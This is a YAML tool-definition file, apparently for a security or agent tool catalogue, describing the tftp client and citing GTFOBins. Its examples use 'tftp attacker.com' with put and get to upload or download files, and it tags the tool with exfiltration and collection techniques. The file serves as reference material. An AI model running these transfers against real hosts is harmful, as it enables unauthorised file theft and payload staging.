---
id: network-ftp-tftp
namespace: network:ftp:tftp
name: tftp
description: "Trivial File Transfer Protocol client; can transfer files and spawn shells."
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- tftp
parameters: []
features: []
execution:
  template: tftp
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files (sudo, suid, unprivileged)
  command: 'tftp attacker.com

    get /path/to/input-file'
- description: Upload files (sudo, suid, unprivileged)
  command: 'tftp attacker.com

    put /path/to/input-file'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/tftp/
techniques:
- collection
- exfiltration
install:
- method: apt
  package_name: tftp-hpa
  commands:
  - apt-get install -y tftp-hpa
---


# tftp

tftp is a command-line utility. Trivial File Transfer Protocol client; can also download files, upload files.
